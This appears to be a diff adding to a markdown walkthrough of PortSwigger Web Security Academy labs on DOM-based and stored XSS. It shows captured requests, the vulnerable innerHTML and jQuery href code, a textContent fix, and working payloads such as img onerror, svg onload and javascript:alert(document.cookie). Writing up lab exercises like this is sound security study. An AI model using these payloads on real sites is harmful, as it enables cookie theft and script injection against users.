@@ -90,6 +90,7 @@ csrf=8ZVfsXNLNxAM5SvnuSe0rZoi3JKmq7u8&postId=7&comment=<script>alert(1)</script>
 ```
 ### And it worked after reloading the page .
 
+---
 # Lab3: DOM XSS in `document.write` sink using source `location.search`
 
 ### In the search bar typed a alphanumeric string and caught the request .
@@ -132,3 +133,88 @@ Te: trailers
 
 <img width="1920" height="843" alt="alert-code" src="https://github.com/user-attachments/assets/b729df16-178d-4644-8a50-959cdd062f7f" />
 
+---
+
+# Lab4: DOM XSS in `innerHTML` sink using source `location.search`
+
+### In the search bar typed a alphanumeric string and caught the request .
+**Request**
+```http
+GET /?search=hello123 HTTP/2
+Host: 0a2400a3041def078082533d00cf0049.web-security-academy.net
+Cookie: session=REDACTED
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a2400a3041def078082533d00cf0049.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+```
+
+### Got the vulnerable portion `innerHTML` , here I tried to exploit with `<script>alert(1)</script>` but didn't work . As `<script>` elements inserted through innerHTML are parsed into the DOM but never executed. So I used `<img src=x onerror=alert(1)>` payload to exploit , this works because 
+- `innerHTML` creates the `<img>` element and its onerror attribute.
+- The browser starts loading the image from src=x, a relative URL that doesn’t exist.
+- The load fails with a 404, so the browser fires the error event.
+- The `onerror` handler runs the JavaScript.
+**Response**
+```http
+                       <script>
+                            function doSearchQuery(query) {
+                                document.getElementById('searchMessage').innerHTML = query;
+                            }
+                            var query = (new URLSearchParams(window.location.search)).get('search');
+                            if(query) {
+                                doSearchQuery(query);
+                            }
+                        </script>
+```
+
+### Below payloads will also work
+- `<svg onload=alert(1)>`
+- `<body onload=alert(1)>`
+### To prevent this use `textContent` (or `innerText`) instead of `innerHTML` when we are only displaying text. The browser then treats the input as plain text, never as markup.
+
+---
+# Lab5: DOM XSS in jQuery anchor href attribute sink using location.search source
+
+### Clicked Submit feedback and captured the request .
+**Request**
+```http
+GET /feedback?returnPath=/post HTTP/2
+Host: 0a4f00bb04b434eb8128d92b00d30028.web-security-academy.net
+Cookie: session=REDACTED
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a4f00bb04b434eb8128d92b00d30028.web-security-academy.net/post?postId=2
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+```
+### The vulnerable portion is `returnPath` , when some alphanumeric string is placed here it get's stored in `href` tag .
+**Response**
+```http
+                                        <div class="is-linkback">
+                                            <a id="backLink">Back</a>
+                                        </div>
+                                        <script>
+                                            $(function() {
+                                                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+                                            });
+                                        </script>
+```
+
+
+### So `href` accepts `javascript:alert(document.cookie)` , when this payload is placed in `returnPath` , hit enter , then we've to click `Back` to execute our payload , previous labs ran automatically as no JS payload was needed .
